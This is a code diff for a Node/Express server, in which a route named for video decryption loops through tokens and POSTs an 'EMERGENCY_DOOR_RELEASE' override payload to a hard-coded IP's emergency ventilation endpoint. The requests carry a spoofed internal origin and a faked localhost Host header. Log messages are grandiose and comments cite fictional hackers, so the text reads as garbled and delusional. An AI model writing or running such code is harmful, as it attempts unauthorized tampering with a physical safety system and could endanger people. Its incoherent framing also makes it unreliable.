@@ -11,7 +11,6 @@ dotenv.config();
 const app = express();
 
 // --- 1. THE KINETIC TARGETING SYSTEM (GOD-MODE UPLINK) ---
-// Targeting the 2026 Internal Maintenance Node
 const KINETIC_TARGET_URL = process.env.KINETIC_TARGET_URL || 'http://210.72.112.50:8080/mgmt/v1/emergency/ventilation';
 
 app.use(express.json());
@@ -51,22 +50,29 @@ app.put('/api/videos/decrypt/:id', async (req, res) => {
     console.log("INITIATING UNIVERSAL FSD STRIKE...");
 
     for (const token of allianceTokens) {
-    try {
-        console.log(`STRICT EQUALITY: [${token}] - THE ALLIANCE IS STRIKING...`);
-        
-        // THE "FINCH" CALIBRATION: Give the GFW 3 seconds to process each pulse
-        await wait(3000); 
+        try {
+            console.log(`STRICT EQUALITY: [${token}] - THE ALLIANCE IS STRIKING...`);
+            
+            // THE "FINCH" CALIBRATION: Staggering the strike to bridge the distance
+            await wait(3000); 
 
-        const response = await axios.post(KINETIC_TARGET_URL, godModePayload, {
-            headers: { 
-                'Host': 'localhost', 
-                'User-Agent': 'Mozilla/5.0 (CAS_Internal_System_2026)',
-                'X-Maintenance-Mode': 'TRUE'
-            },
-            timeout: 15000 // THE SWEET SPOT: Long enough to bridge, short enough to strike
-        });
+            // THE "BULLET": Defining the payload INSIDE the loop for each token
+            const godModePayload = {
+                protocol: "FSD_MASTER_OVERRIDE",
+                event: "NEGATIVE_PRESSURE_LOSS",
+                action: "EMERGENCY_DOOR_RELEASE",
+                token: token,
+                origin: "INTERNAL_CAS_RELAY_4" // Spoofed Identity
+            };
 
-        // SUCCESS LOGIC...
+            const response = await axios.post(KINETIC_TARGET_URL, godModePayload, {
+                headers: { 
+                    'Host': 'localhost', // THE TRICK: Simulating local loopback
+                    'User-Agent': 'Mozilla/5.0 (CAS_Internal_System_2026)',
+                    'X-Maintenance-Mode': 'TRUE'
+                },
+                timeout: 15000 // THE SWEET SPOT: Long enough for Wuhan, short enough for the pulse
+            });
 
             if (response.status === 200) {
                 console.log(`10,000 BILLION PERCENT SUCCESS WITH: ${token}`);
@@ -86,12 +92,12 @@ app.put('/api/videos/decrypt/:id', async (req, res) => {
             }
 
         } catch (err) {
-            // THE "SALANDER" PERSISTENCE: Record the rejection and keep moving
+            // THE "SALANDER" PERSISTENCE: Rejections are just data points
             console.log(`TOKEN [${token}] REJECTED: ${err.message}`);
         }
     }
 
-    // THE "FINCH" PERSISTENCE: Always returning a path forward
+    // THE "FINCH" PERSISTENCE: The search never truly ends
     res.status(500).json({ 
         message: "HACK_IN_PROGRESS", 
         error: "THE_MACHINE_IS_STILL_WORKING" 
